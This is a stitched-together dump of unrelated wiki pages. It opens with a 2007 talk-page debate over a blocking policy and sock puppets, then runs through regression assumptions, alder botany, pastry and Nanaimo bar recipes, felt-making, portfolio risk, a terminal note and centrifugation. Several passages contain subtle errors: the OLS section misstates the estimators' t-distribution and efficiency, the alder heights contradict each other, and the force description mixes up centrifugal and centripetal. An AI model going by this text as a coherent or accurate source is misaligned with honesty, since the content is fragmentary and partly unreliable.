:I agree entirely. I think that this likely doesnt need to be a policy as per your justifications. However, there are some things in here that really do need to be written down to prevent problems. A guideline is a perfect happy medium between the problems you outline and the problems that arise from not saying anything at all. This should be a guideline. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 22:35, 25 February 2007 (UTC)

==3RR==
I'd suggest we don't use the time limit on that like WP. If 2 (groups of) editors are reverting back and forth, they should all get warned, then blocked if they can't keep it on the talk page. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 21:53, 17 August 2006 (UTC)

:Ughhh. Do we really need a new long list for this? Personally, if I have made a block that another user has expressed concern about, I reconsider carefully whether continuing the block is justified, and if I think it is, I'd seek to explain why. I just don't see why we need 5 pages of new policy that good faith editors do not need to be concerned about, and which can give a stick to bad faith editors looking to find an admin in technical violation of the policy. Finally, we just do not need a 3 revert rule here on Wikibooks at present. If things change in the future, we can introduce one, but we don't need it now, [[User:Jguk|Jguk]] 08:42, 18 August 2006 (UTC)

::If, as you say, it hasn't been much of a problem yet, I wouldn't call this the top priority either. OTOH having a bit of discussion on it won't hurt, so long as there's no heavy push to adopt it &quot;by Tuesday, 5PM&quot;. There's several proposals slowly developing at the same time right now in any case. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 10:23, 18 August 2006 (UTC)

::I moved the majority of this text here (with few additions) from the text of [[Wikibooks:Administrators/Unstable]], which in turn is essentially the text of the current administrators policy. There is already a policy to govern deletion, and a standing proposal to govern page protections, so for symmetry it was suggested that there be a separate page concerned only with blocking, so here we are. 
::I would also say that as recently as this month, there have been instances of admins reverting each other's blocks, and assuming a large amount of bad faith. You need to understand that not all people are bound to the same level of professionalism or courtesy as you are, Jguk. Plenty of mistakes have been made, and without explicit say-so, plenty more mistakes will be made in the future. I would much rather be safe then sorry, especially when admins start warring with one another. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 23:22, 19 February 2007 (UTC)

:I also disagree with the inclusion of the 3RR. I think action should be taken at the first revert, and we shouldn't have to wait for a dispute to escalate beyond that. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 23:26, 19 February 2007 (UTC)

::I have defended early the 3RR rule and it is a simpler rule to be applied, it is not perfect but beats taking action on first revert.  --[[User:Panic2k4|Panic]] 18:12, 25 March 2007 (UTC)

== Being Bold ==
Nice to see the inclusion of this point in the proposed policy (not).  As some blocks can be classified as 'being bold' it seems unreasonable that an unblock of the same user can't be 'bold' also.  People might not like that I unblocked Panic (and then blocked him for 2 weeks) but also many didn't like the fact that he was given an indefinite block in the first place.  In addition, according to this proposal, the indefinite block give to Panic is not allowed.

I can't support this proposal as it stands. [[User:Xania|Xania]] [[Image:Flag_of_Poland_2.svg|15px]][[User talk:Xania|&lt;sup&gt;talk&lt;/sup&gt;]] 22:12, 19 February 2007 (UTC)

:It's expressly stated in this policy that blocking and unblocking are never instances where people should be bold. Blocking is an important thing, and it's terrible to think that admins could be blocking people on a whim, or reversing blocks and &quot;wheel warring&quot; on this instance. Wheel warring in any situation is against policy, even more so with admin tools. Admins who revert the actions of other admins without proper discussion should be reprimanded. For that matter, admins who use admin powers without proper justification should likewise be reprimanded. 
:Second, you are highly misinformed on the whole panic issue. The first 3 blocks were all less then 2 weeks, and the fourth block (by [[User:Withinfocus]]) was 6 months, not indefinite. Even now, Panic is blocked for a 2 week span, although Johnny has indicated (and he has community support for this) that the block will be extended until the problem is resolved. According to this policy, the blocks against panic are fully justified: He has repeatedly broken the [[WB:CIVIL]] policy in the past, and he has demonstrated no desire to correct his behavior. By this proposal, he is lucky Johnny is trying so hard to fix the situation. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 23:14, 19 February 2007 (UTC)

::I also think the Be Bold should be removed if all parties are working in good faith there is no need for that clause, stating that is working against the good faith policy.  --[[User:Panic2k4|Panic]] 18:14, 25 March 2007 (UTC)

== Sock puppets ==
What I was attempting to do there is more define what a sock puppet is; we use the term a number of times without really explaining it. [[User:GoToMan|GoToMan]] has raised some question on [[User talk:Chazz|my talk page]] about how this would work, in particular because with a company or home gateway there could be multiple users and user IDs sharing one IP address, which makes it hard to differentiate a sock puppet from a shared IP. My personal opinion is that if user X does thing Y and is blocked, then user Z starts doing thing Y, there is a very real chance that no matter what the IP address, user Z is a sockpuppet of user X; though the same IP address could be indicative. (But not entirely – I personally edit from four different static and one dynamic IP address.) But that is beside the point – that's more along the lines of how they are detected.

GoToMan would prefer to put a policy in place that simply bans sockpuppets. I would quite agree; it would, among other things, cut down on astroturfing. But whether or not they are forbidden by policy, in a case of a block, they will happen; so I would like to see a more formal definition of what a sockpuppet is, and a more solid policy on when they can be banned. And that was the intent of my writings. [[User:Chazz|Chazz]] 09:05, 22 February 2007 (UTC)

:FYI, GoToMan is [[User:Panic2k4]]'s puppet. He's created at least 4 since yesterday to &quot;prove his point&quot; about sockpuppets. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 13:18, 22 February 2007 (UTC)

:There are plenty of legitimate uses for puppet accounts, I personally have a few &quot;secondary&quot; accounts that i use for specific purposes, or that I don't use at all. All of my puppet accounts are well marked, however, as belonging to me. I think what people are concerned with is the bad-faith puppets, puppets who are used to circumvent blocks (a la panic), puppets that are used for vandalism, or puppets that are used to make one side in a dispute look more numerous. While it is frequently possible to make an educated guess about the validity of such accounts, it isn't always possible. The point is that even if we ban sockpuppets, there will still be sockpuppets that we can't identify. I am in favor of such a policy, so that when we find the sockpuppets, we can nuke them. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 14:22, 22 February 2007 (UTC)

::Given that there is no blanket reason to ban sockpuppets,  I think that banning them outright is probably a bad idea. However, we should probably have some sock-puppet specific ban language: e.g. no consultation is needed to block a sockpuppet identified as belonging to a blocked user, though the puppet's talk page can be left open to allow for a misidentified account to be reinstated. Whiteknight's other two bad-faith uses, vandalism and astroturfing (fake grassroots), may need more discussion before we can set policy. I'll work on that a little later. [[User:Chazz|Chazz]] 22:04, 22 February 2007 (UTC)

:::Just a minor correction, &quot;he&quot; didn't say policy but guideline. Blocking or actively disallowing (as in policy) sock puppets, will cause more problems that will solve, an example is the unbalance it will create on the user base (those that know how and those that don't), will also enable witch hunts and create conflicts, what I did propose was a guideline that requested users to avoid using them, nothing more... If a user or (a sock puppet) does break policy he should be blocked, another case is the use of Open Proxys the first method and simplest to bypass Wikimedia checks (normally a user can have several account in one IP, those are easy identifiable), the Open Proxys are indeed dangerous as they will be primarily used for harmful actions in that regard policy should be to block users using them, I don't see a good reason to allow it, but ultimately there is no fix for sock puppets. --Cinap(se) 22:21, 22 February 2007 (UTC)

::::Language here would seem to suggest that Cinap(se) is a sock puppet for Gotoman... [[User:Chazz|Chazz]] 04:24, 23 February 2007 (UTC)

:::::He is. Those accounts, and half a dozen more, are all sockpuppets of [[User:Panic2k4]]. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 13:20, 23 February 2007 (UTC)

::::::Yep. He has even stated as much on his [[User talk:Panic2k4|talk page]]... [[User:Chazz|Chazz]] 17:54, 23 February 2007 (UTC)

:::::::Can anyone defend the block of a sock puppet, I think it should be changed to clearly state a sock puppet that votes on a discussion, that is the only case I can see for a block to be justifiable on a sock puppet.  --[[User:Panic2k4|Panic]] 18:16, 25 March 2007 (UTC)

== Up for Review? ==
I am liking the text of this proposal now, and I think we should bring it up at least for a quick informal review. Wikibooks does take a harder stance towards vandalism then wikipedia does, and in general I would say that our project suffers less vandalism because of it. Also, this proposal introduces new concepts for which we have no pre-existing policy, especially dealing with trolls, and a proceedure for requesting and handling an unblock. Besides these new additions, there is almost nothing in this proposal that is new, and nothing that does not represent the way we already handle blocking and vandals. This is a case, basically, of policy being written to reflect community practice, and it's my hope that this will speed up the adoption of this proposal. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 15:02, 13 April 2007 (UTC)
:Happy with this - my small point would be that I do take into account performance on other wikis when I block.  If there is a bad track record on WP I will reflect that in my block - they '''know''' they are vandals and are looking for &quot;soft&quot; targets (AFAIK Derbeth is of the same view as I ran it past him some time ago) --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 15:40, 13 April 2007 (UTC)

      <text xml:space="preserve">The estimators that we create through linear regression give us a relationship between the variables. However, performing a regression does not automatically give us a reliable relationship between the variables. In order to create reliable relationships, we must know the properties of the estimators &lt;math&gt; \hat{\alpha}, \hat{\beta} &lt;/math&gt; and show that some basic assumptions about the data are true.one must understand that having a good dataset is of enormous importance for applied economic research.

=Unbiasedness=
Under the following four assumptions, OLS is unbiased. This means that:&lt;br /&gt;
&lt;math&gt;E(\hat \alpha) = \alpha&lt;/math&gt;&lt;br /&gt;
&lt;math&gt;E(\hat \beta) = \beta&lt;/math&gt;

===Linearity===
The model must be linear in the parameters.&lt;br /&gt;
The parameters are the coefficients on the independent variables, like &lt;math&gt;\alpha&lt;/math&gt; and &lt;math&gt;\beta&lt;/math&gt;. These must be linear, so having &lt;math&gt;\beta^2&lt;/math&gt; or &lt;math&gt;e^\beta&lt;/math&gt; would violate this assumption.&lt;br /&gt;

===Sample Variation===
The &lt;math&gt;x_i&lt;/math&gt;s cannot all have the same value.

===Random Sampling===
The &lt;math&gt;x_i&lt;/math&gt; values must be randomly selected. In other words, there is no correlation between two different x values: &lt;math&gt;Cov(x_i, x_j) = 0&lt;/math&gt; for &lt;math&gt;i \neq j&lt;/math&gt;.

===Zero Conditional Mean===
The mean of the error terms, given a specific value of the independent variable &lt;math&gt;x_i&lt;/math&gt;, is zero. &lt;math&gt;E(\epsilon_i | X_i) = 0&lt;/math&gt;.

=Efficiency of OLS=
Given the following two assumptions, OLS is the '''B'''est '''L'''inear '''U'''nbiased '''E'''stimator (BLUE). This means that out of all possible linear unbiased estimators, OLS gives the precise estimates of &lt;math&gt;\alpha&lt;/math&gt; and &lt;math&gt;\beta&lt;/math&gt;.

With the third assumption, OLS is the '''B'''est '''U'''nbiased '''E'''stimator (BUE), so it even beats non-linear estimators. Also given this assumption, &lt;math&gt;\hat \alpha&lt;/math&gt; is distributed according to the Student's t-distribution about &lt;math&gt;\alpha&lt;/math&gt;, and &lt;math&gt;\hat \beta&lt;/math&gt; is distributed in such a way about &lt;math&gt;\beta&lt;/math&gt;.

===No Heteroskedasticity===
The variance of the Error terms are constant. &lt;math&gt; Var(u_i|x_i) = \sigma^2&lt;/math&gt;. This means that the variance of the error term &lt;math&gt;u_i&lt;/math&gt; does not depend on the value of &lt;math&gt;x_i&lt;/math&gt;. If this is the case, the error terms are called '''homoskedastic'''. This is not always the case in economic data, for example the variation in a person's wage will vary with their level of education -- someone who is a high-school dropout will not have much variation in their wage, where people with Ph.D.s may see very different wages.

===No Serial Correlation===
The error terms are independently distributed so that their covariance is 0. &lt;math&gt;Cov(u_i, u_j | x_i, x_j) = 0 \forall i \ne j&lt;/math&gt;. 

===Normally Distributed Errors===
The error terms are ''normally distributed''. &lt;math&gt;u_ ~ N(0,\sigma^2)&lt;/math&gt;

'''Alders''' (''Alnus'') are trees and shrubs in the birch family (Family Betulaceae). The genus comprises about 20-30 species of monoecious trees and shrubs, few reaching large size, distributed throughout the North Temperate zone, and in the New World also along the Andes southwards to Chile. The common name ''alder'' is derived from an old Germanic root. The botanic name ''Alnus'' is the original Latin name. 

The best-known species in Europe is the Common or Black Alder (''A. glutinosa''), native to most of Europe and widely introduced elsewhere. The largest species is Red Alder (''A. rubra''), reaching 35 m (the tallest is 32 m) on the west coast of North America, with Black Alder and Italian Alder (''A. cordata'') both reaching about 30 m. By contrast, the widespread Green Alder (''A. viridis'') is rarely more than a 5 m shrub.

==Description==
The leaves are deciduous, alternate, simple, with serrated margins and pinnate veination. Trunks of most species corded, stems thin, flexible, and triangular in cross-section.

The flowers are catkins with elongate male catkins on the same plant as the shorter female catkins, often before leaves appear; they are mainly wind-pollinated, but also visited by bees as a pollen source. They differ from the birches (''Betula'', the other genus in the family) in that the female catkins are woody and do not disintegrate at maturity, opening to release the seeds in a similar manner to many conifer cones. The &quot;cones&quot; are persistent.

Seeds are small winged samaras.

==Growing Conditions==
Sun to shade, adapted to poor soils, and most species do well in wet soils.

==Species==
The genus is divided into three subgenera:

'''Subgenus ''Alnus''.''' Trees. Shoot buds stalked. Male and female catkins produced in autumn (fall) but staying closed over winter, pollinating in late winter or early spring. About 15-25 species, including:
*''Alnus acuminata'' - Andean Alder. Andes Mountains, South America.
*''Alnus cordata'' - Italian Alder. Italy.
*''Alnus cremastogyne''
*''Alnus glutinosa'' - Black Alder. Europe.
*''Alnus incana'' - Grey Alder. Europe &amp; Asia.
**''Alnus oblongifolia'' (''A. incana'' subsp. ''oblongifolia'') - Arizona Alder. Southwestern North America.
**''Alnus rugosa'' (''A. incana'' subsp. ''rugosa'') - Speckled Alder. Northeastern North America.
**''Alnus tenuifolia'' (''A. incana'' subsp. ''tenuifolia'') - Thinleaf Alder or Mountain Alder. Northwestern North America.
*''Alnus japonica'' - Japanese Alder. Japan.
*''Alnus jorullensis'' - Mexican Alder. Mexico, Guatemala.
*''Alnus nepalensis'' - Nepalese Alder. Eastern Himalaya, southwest China.
*''Alnus orientalis'' - Oriental Alder. Southern Turkey, northwest Syria, Cyprus.
*''Alnus rhombifolia'' - White Alder. Interior western North America.
*''Alnus rubra'' - Red Alder. West coastal North America.
*''Alnus serrulata'' - Hazel alder, Tag Alder or Smooth alder. Eastern North America.  
*''Alnus subcordata'' - Caucasian Alder. Caucasus, Iran.

'''Subgenus ''Clethropsis''.''' Trees or shrubs. Shoot buds stalked. Male and female catkins produced in autumn (fall) and expanding and pollinating then. Three species:
*''Alnus formosana'' -Formosan Alder Taiwan
*''Alnus maritima'' - Seaside Alder. East coastal North America, plus disjunct population in Oklahoma.
*''Alnus nitida'' - Himalayan Alder. Western Himalaya.

[[Image:Alnus serrulata leaves.jpg|right|thumb|Leaves of the Tag Alder]]
'''Subgenus ''Alnobetula''.''' Shrubs. Shoot buds not stalked. Male and female catkins produced in late spring (after leaves appear) and expanding and pollinating then. One to four species:
*''Alnus viridis'' - Green Alder. Widespread:
**''Alnus viridis'' subsp. ''viridis''. Eurasia.
**''Alnus viridis'' subsp. ''maximowiczii'' (''A. maximowiczii''). Japan.
**''Alnus viridis'' subsp. ''crispa'' (''A. crispa''). Northern North America.
**''Alnus viridis'' subsp. ''sinuata'' (''A. sinuata'', Sitka Alder or Slide Alder). Western North America, far northeastern Siberia.

==Uses==
[[Image:Alder female 8519.JPG|right|thumb|''Alnus serrulata'' (Tag Alder), female catkins, Johnsonville, South Carolina]]
Alders establish symbioses with the nitrogen-fixing [[../Actinobacteria/]] ''Frankiella alni''. This bacteria converts atmospheric nitrogen into soil-soluble nitrates which can be utilised by the alder, and favorably enhances the soil fertility generally. Alders benefit other plants growing near them by taking nitrogen out of the air and depositing it in the soil in usable form; fallen alder leaves make very rich compost. Alders are sturdy and fast-growing, even in acidic and damaged sites such as burned areas and mining sites. Italian Alder is particularly useful on dry, infertile sites. Alders can be used as a producer of simple bio-mass, growing quickly in harsh environments.

Alder catkins are one of the earliest available sources of pollen for bee species in the spring, especially honeybees, which use it for spring buildup. 

Alders are grown for their bark, form, and for the catkins, which are used in dry floral arrangements. Alders can also be grown as bonsai.

Alder is a preferred wood for charcoal making, formerly used in the manufacture of gunpowder, or for smelting metal ores, now used primarily for cooking. The wood is also traditionally used for smoking fish and meat, though this usage has often been replaced by other woods such as oak and hickory. It is popular as a material for electric guitar bodies, and is used by many guitar makers, notably the Fender Guitar Company, who use it on top quality instruments such as the Stratocaster and Jaguar. Alder provides a brighter tone than other woods (such as mahogany), and as it is not a particularly dense wood it provides a resonant, well-rounded tone with excellent sustain.

==Maintenance==
Alders can be pruned either to encourage a tree-like habit, or coppiced as a dense shrub.

==Propagation==
By cuttings and seed, but cultivars may be budded or grafted.

Seed is collected in autumn as the catkins open, then cold-stratified for spring germination.

Any good pastry can be used, but should be neither too rich nor too flaky.

I find this works very well. Adjust amounts as required.

See also [[Cookbook:Pasties]].

==Ingredients==

* 1 lb flour.
* 1/2 lb mix of lard, and/or butter &amp; suet, equal ratio.
:(Or use vegetarian equivalents)
* Pinch salt.
:(Omit salt for low-sodium diet, or use low-sodium salt)
* Sufficient water to mix to a stiff paste.

== Method ==
*Combine the dry ingredients, then gradually add the water as you mix to a stiff paste.
*Roll to about a 1/4 inch thick.
*Cut rounds with a tea plate.
*Lay on pastry-board with 1/2 on rolling-pin, put in filling, &amp; fold.
*Damp &amp; crimp edges, make slit in middle of pasty.
*Place on baking-sheet, cook in hot oven until golden-brown.

      <text xml:space="preserve">The Project Director manages a variety of tasks including scheduling for each production team and tracking progress to insure that deadlines are met. To keep things moving, this person stays one step ahead of the rest of the class and helps each team understand their most pressing tasks.  The director is also responsible to suggest an interactive navigation flow for the project to the class, and, with input from every team leader, storyboard how various media formats can be used in the end product.  

As concluded by the first project director in 2007, others in this role will probably discover that about 70% of their job is spent in Facebook messaging various people.  The director will take notes during class discussions, log and keep track of important decisions and post this information on Facebook and/or the WikiBook after obtaining sign-offs from the professor, client museum, Creative Animation Inc. and team leaders.   To insure that the product is completed on schedule, the director will assist the teacher in identifying team members not performing up to class standards.

It is suggested that the project director create a “how we did this.” Podcast for future Advanced Interactive Media Classes.  This one minute Podcast should briefly explain the production process including supporting pictures. The project director also collects student biographies for the credits page.  
   
Organization and attention to detail is the key to the project director's success.

==1. From what fiber is felt made? What gives it its tensile strength? ==
[[Image:Coarse Wool 40x.JPG|thumb|400px|Wool fiber under 40X magnification]]
Felt is made from wool.  Wool hairs are covered with tiny scales (see photo) which cause them to interlock with one another.  The scales on a wool fiber are similar to the scales on a pine cone.
&lt;br style=&quot;clear:both&quot;&gt;

==2. List 15 uses of felt. ==
# Crafts
# Felt-tipped pens
# Interfacing (sewing)
# Hats
# Shoe insoles
# Polishing wheels
# Roofing felt
# Gloves
# Slippers
# Yurt walls (a yurt is a Mongolian home)
# Furniture pads
# Table covers
# Pool tables
# Gaskets
# Rugs
# Tents
# Clothing
# Textile art
# Drum cymbal stands to protect the cymbal from cracking

==3. Give three reasons why felt is a good material for handicrafts. ==
# Felt is inexpensive
# It can be made in any color
# It is durable
# Felt can be formed into any shape
# Felt can be easily cut

==4. List the essential steps in felt manufacture. ==
Felt is made by a process called wet felting, where the natural wool fiber is '''stimulated by friction''' and '''lubricated by moisture''' (usually water), and the fibers move at a 90 degree angle towards the friction source and then away again, in effect making little &quot;tacking&quot; stitches. Only 5% of the fibers are active at any one moment, but the process is continual, and so different 'sets' of fibers become activated and then deactivated in the continual process.

This &quot;wet&quot; process utilizes the inherent nature of wool and other animal hairs, because the hairs have scales on them which are directional. The hairs also have kinks in them, and this combination of scales (like the structure of a pine cone) are what react to the stimulation of friction and cause the phenomenon of felting. It tends to work well only with woolen fibers as their scales, when aggravated, bond together to form a cloth.

From the mid-17th to the mid-20th centuries, a process called &quot;carroting&quot; was used in the manufacture of good quality felt for making men's hats. Rabbit or hare skins were treated with a dilute solution of the mercury compound mercuric nitrate. The skins were dried in an oven when the thin fur at the sides went orange - carrot color. Pelts were stretched over a bar in a cutting machine and the skin sliced off in thin shreds, the fleece coming away entirely. The fur was blown onto a cone-shaped colander, treated with hot water to consolidate it, the cone peeled off and passed through wet rollers to cause the fur to felt. These 'hoods' were then dyed and blocked to make hats. This toxic solution and the vapors it produced resulted in widespread cases of mercury poisoning among hatters, which may have been the origin behind the phrase &quot;mad as a hatter&quot;. The United States Public Health Service banned the use of mercury in the felt industry in December 1941.

-----------------------------------------------------------------------------------------------------
'''8 steps to make felt'''

1.
Start with raw wool. It can be straight off the animal without further processing or you can purchase carded wool off the internet or at craft shows. Any color will do.

2.
Assemble wool and liquid dish soap near a sink with running water or use a table top and a bowl of warm water.

3.
Pull a small amount of wool apart and fluff it up by continually pulling it apart. Set this pile of wool aside.

4.
Wet your hands with warm water and add a very small drop of liquid dish soap to your hands.

5.
Pick up the pile of wool and gently roll it between the palms of your hands to form a ball. As the wool begins to felt, press harder so it will stiffen even more.

6.
When the wool is firm, stop rolling and rinse with cold water.

7.
Press it in a towel to remove excess water.

8.
Allow the wool to air dry.

==5. Make two of the following, using at least two different colors of felt: ==
===a. Pennant ===

This [http://www.youtube.com/watch?v=TFNGOTe1xn4 video] shows how to make a pennant.

===b. Bookmark=== 
===c. Refrigerator magnet=== 
===d. Needle case ===
===e. Similar item ===
==6. Make one of the following, using at least four different colors of felt: ==
===a. Small wall mural ===
===b. Holiday decoration=== 
===c. Hand puppet ===
===d. Kitchen knick-knack=== 
==7. Make one of the following, using sewing: ==
===a. Stuffed animal=== 
===b. Stuffed toy ===
===c. Tote bag ===
===d. Bean bag===

      <text xml:space="preserve">== Systematic Risk ==
Systematic risk refers to the portion of risk in a stock that is impossible to avoid, it is also called the market risk, or undiversifiable risk. In the Capital Asset Pricing Model, systematic risk is represented by beta.

&lt;math&gt;E(R_i) = R_f + \beta_{im}(E(R_m) - R_f).\,&lt;/math&gt;

Systematic risk is called undiversifiable risk because no matter how many securities are in a portfolio, there will always be some element of risk. This is due to the possibility of macroeconomic factors causing the entire market to decrease in value. Beta is a measure of how sensitive a particular security is to these market conditions. A stock with a high beta is more sensitive to market conditions; and, conversely, a stock with a low beta is less sensitive.

== Unsystematic Risk ==

Unsystematic risk is also called idiosyncratic risk, or diversifiable risk. It represents the risk of a security that is unrelated to the market in general. Unsystematic risk can be reduced by holding a diversified portfolio. A diversified portfolio eliminates the likelihood of one isolated event causing a large decrease in portfolio value.

[[Image:risk.jpg]]

As you can see from the above image, as the number of stocks in a portfolio increase, the amount of unsystematic risk approaches zero. However, it is impossible to remove systematic risk, as it concerns the economy in general.

When &quot;Terminal&quot; is clicked a command line terminal opens, using [[Bash_Shell_Scripting|BASH]]. The prompt takes the form of fred@desktop where fred is the name of the user entered when setting up Gnome on first use and desktop is the name of the computer. Linux commands may be entered directly at the terminal.

== Profiles ==
Gnome terminal supports profiles, which allows you to use different colour schemes, change fonts, terminal name, turn on effects and do many other things.

[[Image:Nanaimo bar.JPG|thumb|Traditional Nanaimo Bars]]
'''Nanaimo Bars''' are a layered chocolate and custard desert named after the mining town, Nanaimo, British Columbia, Canada.  This winning recipe was submitted by Joyce Hardcastle in 1986 when the City of Nanaimo and Harbour Park Mall had a contest to find the best Nanaimo Bar recipe.

Variations of this recipe include using different nuts and/or adding flavours to the custard layer.

== Ingredients ==
&lt;em&gt;Bottom Layer&lt;/em&gt;
* ½ Cup unsalted [[Cookbook:butter|butter]] (European style cultured)
* ¼ Cup [[Cookbook:sugar|sugar]]
* 5 Tbsp. [[Cookbook:cocoa|cocoa]]
* 1 [[Cookbook:egg|egg]] beaten
* 1 ¼ Cups [[Cookbook:Graham Cracker|Graham wafer]] crumbs
* ½ Cups finely chopped [[Cookbook:almond|almonds]]
* 1 Cup [[Cookbook:coconut|coconut]]
&lt;em&gt;Middle Layer&lt;/em&gt;
* ½ Cup unsalted [[Cookbook:butter|butter]]
* 2 Tbsp. and 2 Tsp. [[Cookbook:cream|cream]]
* 2 Tbsp. vanilla [[Cookbook:custard|custard]] powder
* 2 Cups [[Cookbook:Powdered Sugar|icing sugar]]
&lt;em&gt;Top Layer&lt;/em&gt;
* 4 squares semi-sweet [[Cookbook:chocolate|chocolate]] (1 Oz. each)
* 2 Tbsp. unsalted [[Cookbook:butter|butter]]

== Procedure ==
&lt;em&gt;Bottom Layer&lt;/em&gt;
#Melt first 3 ingredients in top of [[Cookbook:Double Boiler|double boiler]].
#Add egg and stir to cook and thicken. 
#Remove from heat. Stir in crumbs, coconut, and nuts. 
#Press firmly into an ungreased 8&quot; x 8&quot; pan.
&lt;em&gt;Middle Layer&lt;/em&gt;
#Cream butter, cream, custard powder, and icing sugar together well. Beat until light. 
#Spread over bottom layer.
&lt;em&gt;Top Layer&lt;/em&gt;
#Melt chocolate and butter over low heat. Cool. 
#Once cool, but still liquid, pour over second layer and chill in refrigerator.

Once set, cut into squares and serve.  Enjoy.

==Introduction to Centrifugation==
[[Image:Tabletop centrifuge.jpg|thumb|150px|Tabletop centrifuge]]
[[Wikipedia:en:Centrifugation|Centrifugation]] is one of the most important and widely applied research techniques in [[Biochemistry|biochemistry]], cellular and [[Molecular Biology|molecular biology]], and in medicine.  In the field of proteomics it plays a vital role in the fundamental and necessary process of isolating proteins. This process begins with intact cells or tissues. Before the proteins can be obtained, the cells must be broken open by processes such as snap freezing, sonication, homogenization by high pressure, or grinding with liquid nitrogen. Once the cells have been opened up all of their contents; including cell membranes, RNA, DNA, and organelles will be mixed in the solvent with the proteins. Centrifugation is probably the most commonly used method for separating out all the non protein material.  Within the centrifuge samples are spun at high speeds and the resulting force causes particles to separate based on their density.  

==Uses of Centrifugation==
Centrifugation is capable of:
 
*Removing cells or other suspended particles from their surrounding milieu on either a batch or a continous-flow basis 

*Separating one cell type from another 

*Isolating viruses and macromolecules, including DNA, RNA, proteins, and lipids or establishing physical parameters of these particles from their observed behavior during centrifugation

*Separating from dispersed tissue the various subcellular organelles including nuclei, mitochondria, cholorplasts, golgi bodies, lysosomes, peroxisomes, glyoxysomes, plasma membranes, endoplasmic reticulum, polysomes, and ribosomal subunits.  


Once the mixture of proteins has been isolated using centrifugation the scientist is then able to use one of several methods to separate out individual proteins for further study. For more information on protein purification/separation see [[Proteomics/Protein Separations - Chromatography|Protein Separations – Chromatography]] and [[Proteomics/Protein Separations- Electrophoresis|Protein Separations– Electrophoresis]].

==Centrifugation==

[[Image:Tabletop centrifuge.jpg|thumb|150px|Tabletop centrifuge]]

Centrifugation is one of the most important and widely applied research techniques in biochemistry, in cellular and molecular biology, and in medicine. In its various forms, centrifugation is regularly used to:


(1) remove cells or other suspended particles from their surrounding milieu on either a batch or a continous-flow basis.


(2)separate one cell type from another.


(3)isolate viruses and macromolecules, including DNA,RNA,proteins, and lipids or establish physical parameters of these particles fron their observed behavior during centrifugation.


(4)separate from dispersed tissue the various subcellular organelles including nuclei, mitochondria, cholorplasts, golgi bodies , lysosomes, peroxisomes, glyoxysomes, plasma membranes, endoplasmic reticulum , polysomes, and ribosomal subunits.

&quot;Molecular Biology Techniques
Centrifugation&quot;


*Gravity

  
It was Galileo Galilei (1564-1642) who first systemetically and scientifically investigated gravity as a natural phenomenon. The gravitational acceleration constant is customarily assigned the symbol &quot;g&quot; and for simplicity taken to be 980 cm/sec sec. Newton showed that the force acting on a body undergoing constant acceleration is equal to the product of its mass and its acceleration that is,

          F = ma       // Force F = mass x accelaration


*Centrifugal Force



Consider an object P of mass m moving in a horizontal circular path at a constant speed (i.e, at a specific number of revolutions per unit of time and at a fixed distance x from the axis of rotation. Although the speed is constant, the direction of movement is continously changing. Since velocity is defined in terms of the direction of motion, and this direction is changing, the velocity is continously changning and the object is said to manifest constant acceleration.
To restrict the movement to a circular path, a force must be exerted in a horizontal plane toward the axis of rotation. In the absence of such a force, the object would move off along a tangent to the circle. The force called the &quot;centrifugal force&quot; can be given as the same equation.
     
       F=ma.



*Relative Sedimentation Rate



Relative Centrifugal Force--gFORCE
 
Usually , the value cited for the force applied to a suspension of particles during the centrifugation is a relative one, that is to say it is compared with the force that the earth's gravity would have on the same particles.It is called ''relative centrifugal force (RCF)''
        
       RCF = F centifugation / F gravity 

 
CORIOLIS FORCE:   In addition to centrifugal force, particles in suspension ( and the body of suspending fluid itself) within a spinning rotor are subjected to ''Coriolis force''
                  
The Coroilis force which results from the inertia of the liquid and the suspended particles, is a small force directed at the right angles to both the axis of rotation clockwise, the force acts to deflect particles in a counterclockwise direction (and vice versa).Under nearly all experiment conditions, the coroilis force is very small in comparison with  the inertial force, its effects are magnified when the rotor's speed changes (e.g during acceleration and decelartion).
 
While the centrifugal force acts to accelerate a particle away from the axis of rotation, the radially sedimenting particle is also subjected to additional forces including frictional force, the force of buoyancy and gravitational force.
Frictional Forces, Force of Buoyancy.



*The Sedimentation Coefficient



Sedimentation Coefficients of some biological particles differ greatly.The parameters determining sedimentation rate fall into three major categories:

(1) the physical conditions of centrifugation

(2) the nature of the suspending medium.

(3) the properties of the suspending medium( i.e its density and viscosity)


                         
*Diffusion



Diffusion is the bulk movement of solute molecules or particles from a region of higher concentration to a region of lower concentration. Such a movement occurs as a consequence of random molecular motion or Brownian movement. SInce the sedimentation of suspended particles is in effect a means of concentrating the particles, it is opposed by diffusion.

